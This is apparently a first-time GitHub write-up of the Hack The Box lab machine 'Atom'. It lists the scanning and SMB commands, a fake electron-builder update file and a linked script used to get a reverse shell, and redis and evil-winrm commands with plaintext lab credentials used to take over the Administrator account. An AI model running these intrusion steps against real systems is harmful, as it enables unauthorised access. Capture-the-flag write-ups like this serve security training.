[PCTF.pptx](https://github.com/AhmedMoustafa518/atom_-HTB-Writeup-/files/6834554/PCTF.pptx)
# atom_-HTB-Writeup
This  is my first Writeup

Machine      : Atom



Difficulty   : MEDIUM


![1](https://user-images.githubusercontent.com/64806211/126027857-1291cb8f-f41d-4fde-afa4-f621ab74b2fe.png)


1- First make sure you're connected to the machine 

![2](https://user-images.githubusercontent.com/64806211/126027941-56145f26-0e5e-465d-9519-bfdac3a3963c.png)

2- second step have to do is making a scan with nmap


>`nmap -sC -sV -Pn 10.10.10.237`



![22](https://user-images.githubusercontent.com/64806211/126028146-0b149bb6-ffe5-4b84-8a8f-745ebad2446e.png)

![3](https://user-images.githubusercontent.com/64806211/126028026-f28b60f4-1e1c-4782-a5bd-1570af7863b3.png)

So here we got 4 open ports


GREEEEEEEEEEET"""


After checking the site, I couldn't find anything 


!So let's try smbclient 




> `smbclient --list //10.10.10.237/ -u`


![4](https://user-images.githubusercontent.com/64806211/126028702-2f69539a-4280-4db8-a59c-9931abe42764.png)


I found file called Software_Updates 


let's check it out 


>`smbclient -N //10.10.10.237/Software_Updates -u`


















>`ls`




>`get UAT_Testing_Procedures.pdf`

After viewing the pdf 


I found interesting part  :


![6](https://user-images.githubusercontent.com/64806211/126030973-c291e4e2-9267-4e63-814a-6ceca3d19e10.png)


So that means  we could just modify  one of the 3 
client files we found before the server will run the files and execute what’s the inside …. 



I searched alot on google to find somthing interesting about `electron-builder`
and i found alot of blogs and wepsites talking about that and what is used for



So i make a fake `latest.yml`to bypass the payload security check and excute it directly
so i write the shell what will excute our payload to allow us get a REV- 
so you can `dowmload` it from this link : 


>`https://github.com/AhmedMoustafa518/atom_-HTB-Writeup-/blob/ab8f980070ae6e04892c7a0cec50c1df70c9db68/electron_destructor.sh`



so to excute it type : 


>`chmod +x electron_destructor.sh`



and let's run it : 


>`./electron_destructor.sh`




![8](https://user-images.githubusercontent.com/64806211/126031921-1b6f73b0-02c3-474e-9dcf-6efd2d9419b3.png)


Now let's run the listener upload `latest.yml`  and wait until it listen somtheing 



![9](https://user-images.githubusercontent.com/64806211/126032019-5192edd3-7442-413b-a009-2cacbf29a6a9.png) 




![10](https://user-images.githubusercontent.com/64806211/126032041-4f40a326-756e-498d-876e-01d630a9c5c4.png)  





And bingoooooooooo we got the user flag !


![11](https://user-images.githubusercontent.com/64806211/126032084-580a8c33-c17d-4336-a9db-a8bea09d92d1.png)






it’s time for escalation to get the root flag 



Didn’t take too long to find the application called PortableKanban in jason’s downloads 



after searching about portablekanban I found that portablekanban uses a kind of database called redis and by default we can login by the username administrator and a blank password so let's download it using terminal :


>`apt install redis-tools` 



![ins rr](https://user-images.githubusercontent.com/64806211/126032431-178d8f50-9622-44cb-8460-ddf2f358d6ed.png)



Now let's try to use it  to get the  password 

>`redis-cli -h 10.10.10.237 --user administrator -a kidvscat_yes_kidvscat`


well that's say it's wrong so it's time to decrypt it After a lot of searching it was hard to figure how to decrypt it but finally i got the right password 

>`kidvscat_admin_@123` 




Since port 22 is closed and there is no ssh to connect with we are going to use evil-winrm 



![fcjnk](https://user-images.githubusercontent.com/64806211/126032826-8a878477-bf30-40b9-8b91-fe59b9146daa.jpg)




If you're alredy install evil-winrm before u could skip this point and go for the last step 




first we gonna type this command in terminal : 


>`git clone https://github.com/Hackplayers/evil-winrm.git`



![ins2](https://user-images.githubusercontent.com/64806211/126032871-83800c20-29e8-4f09-aa69-5a07dbb47342.png)



second : 

>`sudo gem install winrm winrm-fs stringio`  

![ins1](https://user-images.githubusercontent.com/64806211/126032965-55a69387-84bd-46ca-858a-be63783cff37.png)




>`SO` last thing we wanna do in this is gittin root.txt 



>`cd evil-winrm && ruby evil-winrm.rb -i 10.10.10.237 -u Administrator -p kidvscat_admin_@123`      



![last](https://user-images.githubusercontent.com/64806211/126033359-da977446-64ec-4c27-8f73-7ff62f912345.png)
![lastrr](https://user-images.githubusercontent.com/64806211/126033363-d0c747a6-5b7f-4736-bf87-3799ee721565.png)



finally 



>`We are Legion. We do not forgive. We do not forget.`




![lastrr](https://user-images.githubusercontent.com/64806211/126033310-b63c7821-0ed3-4db4-bf30-ad045ffdecaa.png)


